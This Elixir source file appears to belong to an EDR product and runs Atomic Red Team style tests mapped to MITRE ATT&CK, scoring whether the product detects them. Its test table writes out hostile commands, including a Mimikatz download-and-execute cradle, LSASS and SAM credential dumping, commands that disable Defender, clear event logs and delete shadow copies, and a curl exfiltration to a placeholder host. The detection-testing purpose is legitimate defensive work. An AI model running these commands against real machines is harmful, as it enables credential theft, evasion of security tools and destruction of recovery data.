defmodule TamanduaServer.Validation.EDRTester do
  @moduledoc """
  EDR Validation and Testing Framework

  Provides automated testing capabilities to validate EDR detection coverage
  using Atomic Red Team tests mapped to MITRE ATT&CK techniques.

  Features:
  - Schedule and execute Atomic Red Team tests against connected agents
  - Collect and analyze detection results
  - Generate coverage reports and benchmarks
  - Compare with industry baselines and competitors
  - Identify detection gaps and recommend improvements
  """

  use GenServer
  require Logger

  alias TamanduaServer.Agents
  alias TamanduaServer.Alerts

  @test_timeout_ms 60_000
  @detection_window_ms 30_000

  # MITRE ATT&CK techniques covered by Atomic Red Team
  # Prioritized by prevalence in 2025-2026 attacks
  @atomic_tests %{
    # Execution
    "T1059.001" => %{
      name: "PowerShell",
      category: :execution,
      priority: :critical,
      tests: [
        %{id: 1, name: "Mimikatz", command: "powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')"},
        %{id: 2, name: "Encoded Command", command: "powershell -enc [base64_command]"},
        %{id: 3, name: "Download Cradle", command: "powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://test.local/payload.ps1')\""}
      ]
    },
    "T1059.003" => %{
      name: "Windows Command Shell",
      category: :execution,
      priority: :high,
      tests: [
        %{id: 1, name: "CMD Execution", command: "cmd.exe /c whoami"},
        %{id: 2, name: "Batch Script", command: "cmd.exe /c test.bat"}
      ]
    },
    "T1059.005" => %{
      name: "Visual Basic",
      category: :execution,
      priority: :medium,
      tests: [
        %{id: 1, name: "VBScript Execution", command: "cscript.exe //nologo test.vbs"}
      ]
    },
    "T1059.007" => %{
      name: "JavaScript",
      category: :execution,
      priority: :medium,
      tests: [
        %{id: 1, name: "JScript Execution", command: "cscript.exe //nologo test.js"},
        %{id: 2, name: "Wscript", command: "wscript.exe test.js"}
      ]
    },

    # Persistence
    "T1547.001" => %{
      name: "Registry Run Keys",
      category: :persistence,
      priority: :critical,
      tests: [
        %{id: 1, name: "HKCU Run Key", command: "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Test /t REG_SZ /d \"C:\\test.exe\""},
        %{id: 2, name: "HKLM Run Key", command: "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Test /t REG_SZ /d \"C:\\test.exe\""}
      ]
    },
    "T1053.005" => %{
      name: "Scheduled Task",
      category: :persistence,
      priority: :high,
      tests: [
        %{id: 1, name: "Create Task", command: "schtasks /create /tn Test /tr \"C:\\test.exe\" /sc daily"}
      ]
    },
    "T1543.003" => %{
      name: "Windows Service",
      category: :persistence,
      priority: :high,
      tests: [
        %{id: 1, name: "Create Service", command: "sc create TestService binPath= \"C:\\test.exe\""}
      ]
    },

    # Defense Evasion
    "T1027" => %{
      name: "Obfuscated Files or Information",
      category: :defense_evasion,
      priority: :critical,
      tests: [
        %{id: 1, name: "Base64 Encoding", command: "certutil -encode test.exe encoded.txt"},
        %{id: 2, name: "XOR Encoding", command: "custom_xor_encoder"}
      ]
    },
    "T1562.001" => %{
      name: "Disable Security Tools",
      category: :defense_evasion,
      priority: :critical,
      tests: [
        %{id: 1, name: "Disable Defender", command: "Set-MpPreference -DisableRealtimeMonitoring $true"},
        %{id: 2, name: "Stop Service", command: "net stop WinDefend"}
      ]
    },
    "T1070.001" => %{
      name: "Clear Windows Event Logs",
      category: :defense_evasion,
      priority: :high,
      tests: [
        %{id: 1, name: "Clear Security Log", command: "wevtutil cl Security"},
        %{id: 2, name: "Clear System Log", command: "wevtutil cl System"}
      ]
    },
    "T1218.011" => %{
      name: "Rundll32",
      category: :defense_evasion,
      priority: :high,
      tests: [
        %{id: 1, name: "Rundll32 Execution", command: "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";"}
      ]
    },

    # Credential Access
    "T1003.001" => %{
      name: "LSASS Memory",
      category: :credential_access,
      priority: :critical,
      tests: [
        %{id: 1, name: "Mimikatz sekurlsa", command: "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\""},
        %{id: 2, name: "ProcDump LSASS", command: "procdump.exe -ma lsass.exe lsass.dmp"},
        %{id: 3, name: "Comsvcs.dll", command: "rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump"}
      ]
    },
    "T1003.002" => %{
      name: "SAM Registry",
      category: :credential_access,
      priority: :critical,
      tests: [
        %{id: 1, name: "Reg Save SAM", command: "reg save HKLM\\SAM sam.save"},
        %{id: 2, name: "Reg Save SYSTEM", command: "reg save HKLM\\SYSTEM system.save"}
      ]
    },
    "T1003.003" => %{
      name: "NTDS.dit",
      category: :credential_access,
      priority: :critical,
      tests: [
        %{id: 1, name: "VSS Copy NTDS", command: "vssadmin create shadow /for=C:"},
        %{id: 2, name: "NTDSUtil", command: "ntdsutil \"ac i ntds\" \"ifm\" \"create full c:\\temp\""}
      ]
    },
    "T1555.003" => %{
      name: "Credentials from Web Browsers",
      category: :credential_access,
      priority: :high,
      tests: [
        %{id: 1, name: "Chrome Login Data", command: "copy \"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data\""}
      ]
    },

    # Discovery
    "T1087.001" => %{
      name: "Local Account Discovery",
      category: :discovery,
      priority: :medium,
      tests: [
        %{id: 1, name: "Net User", command: "net user"},
        %{id: 2, name: "WMIC User", command: "wmic useraccount list"}
      ]
    },
    "T1082" => %{
      name: "System Information Discovery",
      category: :discovery,
      priority: :medium,
      tests: [
        %{id: 1, name: "Systeminfo", command: "systeminfo"},
        %{id: 2, name: "Hostname", command: "hostname"}
      ]
    },
    "T1083" => %{
      name: "File and Directory Discovery",
      category: :discovery,
      priority: :low,
      tests: [
        %{id: 1, name: "Dir Command", command: "dir /s /b c:\\users\\*password*"}
      ]
    },

    # Lateral Movement
    "T1021.002" => %{
      name: "SMB/Windows Admin Shares",
      category: :lateral_movement,
      priority: :critical,
      tests: [
        %{id: 1, name: "Net Use Admin$", command: "net use \\\\target\\admin$ /user:admin password"},
        %{id: 2, name: "Copy to C$", command: "copy malware.exe \\\\target\\c$\\windows\\temp\\"}
      ]
    },
    "T1021.006" => %{
      name: "Windows Remote Management",
      category: :lateral_movement,
      priority: :high,
      tests: [
        %{id: 1, name: "WinRM", command: "winrs -r:target cmd.exe"},
        %{id: 2, name: "Invoke-Command", command: "Invoke-Command -ComputerName target -ScriptBlock {whoami}"}
      ]
    },
    "T1047" => %{
      name: "Windows Management Instrumentation",
      category: :lateral_movement,
      priority: :high,
      tests: [
        %{id: 1, name: "WMIC Process Create", command: "wmic /node:target process call create \"cmd.exe\""}
      ]
    },
    "T1570" => %{
      name: "Lateral Tool Transfer",
      category: :lateral_movement,
      priority: :high,
      tests: [
        %{id: 1, name: "PsExec", command: "psexec.exe \\\\target cmd.exe"}
      ]
    },

    # Collection
    "T1005" => %{
      name: "Data from Local System",
      category: :collection,
      priority: :medium,
      tests: [
        %{id: 1, name: "Find Sensitive Files", command: "dir /s /b c:\\users\\*password*.txt"}
      ]
    },
    "T1039" => %{
      name: "Data from Network Shared Drive",
      category: :collection,
      priority: :medium,
      tests: [
        %{id: 1, name: "Net Share Enum", command: "net view \\\\target"}
      ]
    },

    # Command and Control
    "T1071.001" => %{
      name: "Web Protocols (HTTP/HTTPS)",
      category: :command_control,
      priority: :high,
      tests: [
        %{id: 1, name: "HTTP Beacon", command: "curl http://c2.server.com/beacon"}
      ]
    },
    "T1071.004" => %{
      name: "DNS Tunneling",
      category: :command_control,
      priority: :high,
      tests: [
        %{id: 1, name: "DNS TXT Query", command: "nslookup -type=txt encoded.data.c2server.com"}
      ]
    },
    "T1105" => %{
      name: "Ingress Tool Transfer",
      category: :command_control,
      priority: :high,
      tests: [
        %{id: 1, name: "Certutil Download", command: "certutil -urlcache -split -f http://server/file.exe"},
        %{id: 2, name: "BITSAdmin", command: "bitsadmin /transfer job http://server/file.exe c:\\temp\\file.exe"}
      ]
    },

    # Exfiltration
    "T1048.003" => %{
      name: "Exfiltration Over Unencrypted Protocol",
      category: :exfiltration,
      priority: :high,
      tests: [
        %{id: 1, name: "FTP Upload", command: "ftp -s:script.txt server"},
        %{id: 2, name: "HTTP POST", command: "curl -X POST -d @data.txt http://exfil.server.com"}
      ]
    },

    # Impact
    "T1486" => %{
      name: "Data Encrypted for Impact (Ransomware)",
      category: :impact,
      priority: :critical,
      tests: [
        %{id: 1, name: "File Encryption", command: "encrypt_test.exe c:\\users\\documents\\"}
      ]
    },
    "T1490" => %{
      name: "Inhibit System Recovery",
      category: :impact,
      priority: :critical,
      tests: [
        %{id: 1, name: "Delete Shadow Copies", command: "vssadmin delete shadows /all /quiet"},
        %{id: 2, name: "BCDEdit Recovery", command: "bcdedit /set {default} recoveryenabled no"}
      ]
    }
  }

  # Optional external benchmark baselines. Kept empty until real, sourced
  # benchmark data is integrated; the UI must not show invented competitor rates.
  @industry_baselines %{}

  defstruct [
    :test_sessions,
    :results_cache,
    :running_tests,
    :stats
  ]

  # Client API

  def start_link(opts \\ []) do
    GenServer.start_link(__MODULE__, opts, name: __MODULE__)
  end

  @doc """
  Get all available Atomic Red Team tests mapped to MITRE ATT&CK
  """
  def get_available_tests do
    GenServer.call(__MODULE__, :get_available_tests)
  end

  @doc """
  Run a specific test against an agent
  """
  def run_test(agent_id, technique_id, test_number \\ 1, opts \\ []) do
    GenServer.call(__MODULE__, {:run_test, agent_id, technique_id, test_number, opts}, @test_timeout_ms)
  end

  @doc """
  Run a full test suite against an agent
  """
  def run_test_suite(agent_id, opts \\ []) do
    GenServer.call(__MODULE__, {:run_suite, agent_id, opts}, 300_000)
  end

  @doc """
  Run tests for a specific MITRE tactic
  """
  def run_tactic_tests(agent_id, tactic, opts \\ []) do
    GenServer.call(__MODULE__, {:run_tactic, agent_id, tactic, opts}, 120_000)
  end

  @doc """
  Get test results for an agent
  """
  def get_results(agent_id, opts \\ []) do
    GenServer.call(__MODULE__, {:get_results, agent_id, opts})
  end

  @doc """
  Get coverage report comparing against industry baselines
  """
  def get_coverage_report(agent_id) do
    GenServer.call(__MODULE__, {:coverage_report, agent_id})
  end

  @doc """
  Get benchmark comparison with competitors
  """
  def get_benchmark_comparison do
    GenServer.call(__MODULE__, :benchmark_comparison)
  end

  @doc """
  Get detection gaps and recommendations
  """
  def get_gaps_and_recommendations(agent_id) do
    GenServer.call(__MODULE__, {:gaps_recommendations, agent_id})
  end

  @doc """
  Get overall stats
  """
  def get_stats do
    GenServer.call(__MODULE__, :get_stats)
  end

  @doc """
  Get configured industry baselines.
  """
  def get_industry_baselines do
    {:ok, []}
  end

  # Server Callbacks

  @impl true
  def init(_opts) do
    state = %__MODULE__{
      test_sessions: %{},
      results_cache: %{},
      running_tests: %{},
      stats: %{
        total_tests_run: 0,
        total_detections: 0,
        agents_tested: MapSet.new(),
        last_test_run: nil
      }
    }

    Logger.info("EDR Tester initialized with #{map_size(@atomic_tests)} techniques")
    {:ok, state}
  end

  @impl true
  def handle_call(:get_available_tests, _from, state) do
    tests = Enum.map(@atomic_tests, fn {technique_id, info} ->
      %{
        technique_id: technique_id,
        name: info.name,
        category: info.category,
        priority: info.priority,
        test_count: length(info.tests)
      }
    end)
    |> Enum.sort_by(fn t ->
      priority_order = %{critical: 0, high: 1, medium: 2, low: 3}
      Map.get(priority_order, t.priority, 4)
    end)

    {:reply, {:ok, tests}, state}
  end

  @impl true
  def handle_call({:run_test, agent_id, technique_id, test_number, opts}, _from, state) do
    case Map.get(@atomic_tests, technique_id) do
      nil ->
        {:reply, {:error, :unknown_technique}, state}

      test_info ->
        test = Enum.at(test_info.tests, test_number - 1)
        if test do
          result = execute_test(agent_id, technique_id, test, test_info, opts)
          new_state = record_result(state, agent_id, technique_id, test_number, result)
          {:reply, {:ok, result}, new_state}
        else
          {:reply, {:error, :unknown_test_number}, state}
        end
    end
  end

  @impl true
  def handle_call({:run_suite, agent_id, opts}, _from, state) do
    dry_run = Keyword.get(opts, :dry_run, false)
    categories = Keyword.get(opts, :categories, :all)

    tests_to_run = @atomic_tests
    |> Enum.filter(fn {_id, info} ->
      categories == :all or info.category in List.wrap(categories)
    end)
    |> Enum.sort_by(fn {_id, info} ->
      priority_order = %{critical: 0, high: 1, medium: 2, low: 3}
      Map.get(priority_order, info.priority, 4)
    end)

    results = if dry_run do
      Enum.map(tests_to_run, fn {technique_id, info} ->
        %{
          technique_id: technique_id,
          name: info.name,
          category: info.category,
          status: :planned,
          tests: length(info.tests)
        }
      end)
    else
      Enum.flat_map(tests_to_run, fn {technique_id, test_info} ->
        Enum.with_index(test_info.tests, 1)
        |> Enum.map(fn {test, idx} ->
          result = execute_test(agent_id, technique_id, test, test_info, opts)
          %{
            technique_id: technique_id,
            test_number: idx,
            name: test.name,
            result: result
          }
        end)
      end)
    end

    new_state = if dry_run do
      state
    else
      update_stats(state, agent_id, results)
    end

    summary = summarize_results(results)
    {:reply, {:ok, %{results: results, summary: summary}}, new_state}
  end

  @impl true
  def handle_call({:run_tactic, agent_id, tactic, opts}, _from, state) do
    category = tactic_to_category(tactic)

    tests_to_run = @atomic_tests
    |> Enum.filter(fn {_id, info} -> info.category == category end)

    results = Enum.flat_map(tests_to_run, fn {technique_id, test_info} ->
      Enum.with_index(test_info.tests, 1)
      |> Enum.map(fn {test, idx} ->
        result = execute_test(agent_id, technique_id, test, test_info, opts)
        %{
          technique_id: technique_id,
          test_number: idx,
          name: test.name,
          result: result
        }
      end)
    end)

    new_state = update_stats(state, agent_id, results)
    summary = summarize_results(results)
    {:reply, {:ok, %{tactic: tactic, results: results, summary: summary}}, new_state}
  end

  @impl true
  def handle_call({:get_results, agent_id, _opts}, _from, state) do
    results = Map.get(state.results_cache, agent_id, [])
    {:reply, {:ok, results}, state}
  end

  @impl true
  def handle_call({:coverage_report, agent_id}, _from, state) do
    results = Map.get(state.results_cache, agent_id, [])

    coverage = calculate_coverage(results)

    report = %{
      agent_id: agent_id,
      overall_coverage: coverage.overall,
      by_category: coverage.by_category,
      by_priority: coverage.by_priority,
      techniques_tested: coverage.tested,
      techniques_detected: coverage.detected,
      techniques_missed: coverage.missed,
      industry_comparison: compare_to_baselines(coverage),
      generated_at: DateTime.utc_now()
    }

    {:reply, {:ok, report}, state}
  end

  @impl true
  def handle_call(:benchmark_comparison, _from, state) do
    # Calculate overall detection rate from all tested agents
    all_results = state.results_cache
    |> Map.values()
    |> List.flatten()

    tamandua_coverage = calculate_coverage(all_results)

    comparison = %{
      tamandua: tamandua_coverage.by_category,
      competitors: @industry_baselines,
      strengths: identify_strengths(tamandua_coverage, @industry_baselines),
      weaknesses: identify_weaknesses(tamandua_coverage, @industry_baselines),
      recommendations: generate_improvement_recommendations(tamandua_coverage, @industry_baselines)
    }

    {:reply, {:ok, comparison}, state}
  end

  @impl true
  def handle_call({:gaps_recommendations, agent_id}, _from, state) do
    results = Map.get(state.results_cache, agent_id, [])
    coverage = calculate_coverage(results)

    gaps = identify_detection_gaps(results)
    recommendations = generate_gap_recommendations(gaps)

    {:reply, {:ok, %{gaps: gaps, recommendations: recommendations, coverage: coverage}}, state}
  end

  @impl true
  def handle_call(:get_stats, _from, state) do
    stats = Map.merge(state.stats, %{
      agents_tested_count: MapSet.size(state.stats.agents_tested),
      techniques_available: map_size(@atomic_tests),
      detection_rate: calculate_overall_detection_rate(state.results_cache)
    })
    {:reply, {:ok, stats}, state}
  end

  # Private Functions

  defp execute_test(agent_id, technique_id, test, test_info, opts) do
    simulate_only = Keyword.get(opts, :simulate, true)

    # Record test start time
    start_time = DateTime.utc_now()

    if simulate_only do
      # In simulation mode, we don't execute the actual command
      # Instead, we check if we have existing alerts matching this technique
      detected = check_existing_detection(agent_id, technique_id)

      %{
        technique_id: technique_id,
        test_name: test.name,
        category: test_info.category,
        priority: test_info.priority,
        command: test.command,
        executed: false,
        simulated: true,
        dry_run: true,
        simulation_mode: "dry_run_existing_detection_check",
        detected: detected,
        detection_source: "existing_alerts",
        detection_time_ms: nil,
        alert_id: if(detected, do: get_matching_alert_id(agent_id, technique_id), else: nil),
        timestamp: start_time
      }
    else
      # Real execution - send command to agent and wait for detection
      case Agents.send_command(agent_id, %{
        command_type: "execute_test",
        payload: %{
          technique_id: technique_id,
          command: test.command,
          timeout_ms: @test_timeout_ms
        }
      }) do
        {:ok, :sent} ->
          # Wait for detection
          Process.sleep(@detection_window_ms)
          detected = check_detection_within_window(agent_id, technique_id, start_time)

          %{
            technique_id: technique_id,
            test_name: test.name,
            category: test_info.category,
            priority: test_info.priority,
            command: test.command,
            executed: true,
            simulated: false,
            detected: detected,
            detection_time_ms: calculate_detection_latency(agent_id, technique_id, start_time),
            alert_id: get_matching_alert_id(agent_id, technique_id),
            timestamp: start_time
          }

        {:error, reason} ->
          %{
            technique_id: technique_id,
            test_name: test.name,
            category: test_info.category,
            priority: test_info.priority,
            error: reason,
            executed: false,
            detected: false,
            timestamp: start_time
          }
      end
    end
  end

  defp check_existing_detection(agent_id, technique_id) do
    # Check if we have alerts matching this technique in the last 24 hours
    since = DateTime.add(DateTime.utc_now(), -86400, :second)

    case Alerts.list_alerts(%{
      agent_id: agent_id,
      since: since,
      mitre_techniques: [technique_id]
    }) do
      {:ok, alerts} -> length(alerts) > 0
      _ -> false
    end
  rescue
    _ -> false
  end

  defp check_detection_within_window(agent_id, technique_id, since) do
    case Alerts.list_alerts(%{
      agent_id: agent_id,
      since: since,
      mitre_techniques: [technique_id]
    }) do
      {:ok, alerts} -> length(alerts) > 0
      _ -> false
    end
  rescue
    _ -> false
  end

  defp calculate_detection_latency(_agent_id, _technique_id, _start_time) do
    # Would calculate actual latency from alert timestamp
    nil
  end

  defp get_matching_alert_id(_agent_id, _technique_id) do
    nil
  end

  defp record_result(state, agent_id, technique_id, test_number, result) do
    key = "#{technique_id}-#{test_number}"
    agent_results = Map.get(state.results_cache, agent_id, %{})
    new_agent_results = Map.put(agent_results, key, result)

    %{state |
      results_cache: Map.put(state.results_cache, agent_id, new_agent_results),
      stats: %{state.stats |
        total_tests_run: state.stats.total_tests_run + 1,
        total_detections: state.stats.total_detections + if(result.detected, do: 1, else: 0),
        agents_tested: MapSet.put(state.stats.agents_tested, agent_id),
        last_test_run: DateTime.utc_now()
      }
    }
  end

  defp update_stats(state, agent_id, results) do
    detections = Enum.count(results, fn r -> r.result[:detected] == true end)

    %{state |
      stats: %{state.stats |
        total_tests_run: state.stats.total_tests_run + length(results),
        total_detections: state.stats.total_detections + detections,
        agents_tested: MapSet.put(state.stats.agents_tested, agent_id),
        last_test_run: DateTime.utc_now()
      }
    }
  end

  defp summarize_results(results) do
    total = length(results)
    detected = Enum.count(results, fn r -> r.result[:detected] == true or r[:status] == :detected end)

    by_category = results
    |> Enum.group_by(fn r -> r.result[:category] || r[:category] end)
    |> Enum.map(fn {cat, items} ->
      cat_detected = Enum.count(items, fn r -> r.result[:detected] == true end)
      {cat, %{total: length(items), detected: cat_detected, rate: if(length(items) > 0, do: cat_detected / length(items), else: 0)}}
    end)
    |> Enum.into(%{})

    %{
      total_tests: total,
      detected: detected,
      missed: total - detected,
      detection_rate: if(total > 0, do: Float.round(detected / total * 100, 1), else: 0),
      by_category: by_category
    }
  end

  defp calculate_coverage(results) when is_list(results) do
    results_list =
      cond do
        results == [] ->
          []

        is_map(hd(results)) ->
          results

        true ->
          results
          |> Enum.flat_map(fn {_k, v} -> if is_list(v), do: v, else: [v] end)
      end

    total = length(results_list)
    detected = Enum.count(results_list, fn r -> r[:detected] == true end)

    by_category = results_list
    |> Enum.group_by(& &1[:category])
    |> Enum.map(fn {cat, items} ->
      cat_detected = Enum.count(items, & &1[:detected])
      rate = if length(items) > 0, do: cat_detected / length(items), else: 0.0
      {cat, rate}
    end)
    |> Enum.into(%{})

    by_priority = results_list
    |> Enum.group_by(& &1[:priority])
    |> Enum.map(fn {pri, items} ->
      pri_detected = Enum.count(items, & &1[:detected])
      rate = if length(items) > 0, do: pri_detected / length(items), else: 0.0
      {pri, rate}
    end)
    |> Enum.into(%{})

    %{
      overall: if(total > 0, do: detected / total, else: 0.0),
      by_category: by_category,
      by_priority: by_priority,
      tested: total,
      detected: detected,
      missed: total - detected
    }
  end

  defp calculate_coverage(results) when is_map(results) do
    calculate_coverage(Map.values(results) |> List.flatten())
  end

  defp calculate_coverage(_), do: %{overall: 0.0, by_category: %{}, by_priority: %{}, tested: 0, detected: 0, missed: 0}

  defp compare_to_baselines(coverage) do
    Enum.map(@industry_baselines, fn {competitor, baseline} ->
      diff = coverage.overall - baseline.overall

      status = cond do
        diff > 0.05 -> :better
        diff < -0.05 -> :worse
        true -> :similar
      end

      {competitor, %{
        their_rate: baseline.overall,
        our_rate: coverage.overall,
        difference: Float.round(diff * 100, 1),
        status: status
      }}
    end)
    |> Enum.into(%{})
  end

  defp identify_strengths(coverage, baselines) do
    industry_avg = baselines[:industry_average] || %{}

    if map_size(industry_avg) == 0 do
      []
    else
      coverage.by_category
      |> Enum.filter(fn {cat, rate} ->
        baseline_rate = Map.get(industry_avg, cat, 0)
        rate > baseline_rate + 0.05
      end)
      |> Enum.map(fn {cat, rate} ->
        %{category: cat, rate: rate, above_average_by: rate - Map.get(industry_avg, cat, 0)}
      end)
    end
  end

  defp identify_weaknesses(coverage, baselines) do
    industry_avg = baselines[:industry_average] || %{}

    if map_size(industry_avg) == 0 do
      []
    else
      coverage.by_category
      |> Enum.filter(fn {cat, rate} ->
        baseline_rate = Map.get(industry_avg, cat, 0)
        rate < baseline_rate - 0.05
      end)
      |> Enum.map(fn {cat, rate} ->
        %{category: cat, rate: rate, below_average_by: Map.get(industry_avg, cat, 0) - rate}
      end)
    end
  end

  defp identify_detection_gaps(results) do
    results
    |> Enum.filter(fn {_k, r} -> r[:detected] == false end)
    |> Enum.map(fn {_k, r} ->
      %{
        technique_id: r[:technique_id],
        name: r[:test_name],
        category: r[:category],
        priority: r[:priority]
      }
    end)
    |> Enum.sort_by(fn g ->
      priority_order = %{critical: 0, high: 1, medium: 2, low: 3}
      Map.get(priority_order, g.priority, 4)
    end)
  end

  defp generate_improvement_recommendations(coverage, _baselines) do
    recommendations = []

    # Check each category
    recommendations = if Map.get(coverage.by_category, :credential_access, 1.0) < 0.90 do
      [%{
        priority: :critical,
        category: :credential_access,
        recommendation: "Improve LSASS protection monitoring and credential dumping detection",
        techniques: ["T1003.001", "T1003.002", "T1003.003"]
      } | recommendations]
    else
      recommendations
    end

    recommendations = if Map.get(coverage.by_category, :defense_evasion, 1.0) < 0.85 do
      [%{
        priority: :high,
        category: :defense_evasion,
        recommendation: "Add detection for common evasion techniques like encoding and LOLBins",
        techniques: ["T1027", "T1218.011", "T1562.001"]
      } | recommendations]
    else
      recommendations
    end

    recommendations = if Map.get(coverage.by_category, :execution, 1.0) < 0.90 do
      [%{
        priority: :critical,
        category: :execution,
        recommendation: "Enable enhanced PowerShell logging and script block analysis",
        techniques: ["T1059.001", "T1059.003"]
      } | recommendations]
    else
      recommendations
    end

    recommendations = if Map.get(coverage.by_category, :lateral_movement, 1.0) < 0.85 do
      [%{
        priority: :high,
        category: :lateral_movement,
        recommendation: "Improve SMB and WinRM lateral movement detection",
        techniques: ["T1021.002", "T1021.006", "T1047"]
      } | recommendations]
    else
      recommendations
    end

    Enum.sort_by(recommendations, fn r ->
      priority_order = %{critical: 0, high: 1, medium: 2, low: 3}
      Map.get(priority_order, r.priority, 4)
    end)
  end

  defp generate_gap_recommendations(gaps) do
    gaps
    |> Enum.group_by(& &1.category)
    |> Enum.map(fn {category, category_gaps} ->
      techniques = Enum.map(category_gaps, & &1.technique_id)

      %{
        category: category,
        gap_count: length(category_gaps),
        techniques: techniques,
        recommendation: get_category_recommendation(category),
        priority: get_max_priority(category_gaps)
      }
    end)
    |> Enum.sort_by(fn r ->
      priority_order = %{critical: 0, high: 1, medium: 2, low: 3}
      Map.get(priority_order, r.priority, 4)
    end)
  end

  defp get_category_recommendation(:execution), do: "Enable enhanced command-line logging and script analysis"
  defp get_category_recommendation(:persistence), do: "Monitor registry run keys, scheduled tasks, and service creation"
  defp get_category_recommendation(:defense_evasion), do: "Add LOLBin detection and encoded payload analysis"
  defp get_category_recommendation(:credential_access), do: "Enable LSASS protection and credential store monitoring"
  defp get_category_recommendation(:lateral_movement), do: "Monitor administrative shares and remote execution tools"
  defp get_category_recommendation(:command_control), do: "Analyze network traffic for C2 patterns"
  defp get_category_recommendation(:exfiltration), do: "Monitor large data transfers and unusual protocols"
  defp get_category_recommendation(:impact), do: "Enable ransomware behavior detection and VSS monitoring"
  defp get_category_recommendation(_), do: "Review and add detection rules for this category"

  defp get_max_priority(gaps) do
    priorities = Enum.map(gaps, & &1.priority)
    cond do
      :critical in priorities -> :critical
      :high in priorities -> :high
      :medium in priorities -> :medium
      true -> :low
    end
  end

  defp calculate_overall_detection_rate(results_cache) do
    all_results = results_cache
    |> Map.values()
    |> Enum.flat_map(fn r -> if is_map(r), do: Map.values(r), else: r end)

    total = length(all_results)
    if total > 0 do
      detected = Enum.count(all_results, fn r -> r[:detected] == true end)
      Float.round(detected / total * 100, 1)
    else
      0.0
    end
  end

  defp tactic_to_category(:initial_access), do: :initial_access
  defp tactic_to_category(:execution), do: :execution
  defp tactic_to_category(:persistence), do: :persistence
  defp tactic_to_category(:privilege_escalation), do: :privilege_escalation
  defp tactic_to_category(:defense_evasion), do: :defense_evasion
  defp tactic_to_category(:credential_access), do: :credential_access
  defp tactic_to_category(:discovery), do: :discovery
  defp tactic_to_category(:lateral_movement), do: :lateral_movement
  defp tactic_to_category(:collection), do: :collection
  defp tactic_to_category(:command_and_control), do: :command_control
  defp tactic_to_category(:exfiltration), do: :exfiltration
  defp tactic_to_category(:impact), do: :impact
  defp tactic_to_category(tactic), do: tactic
end
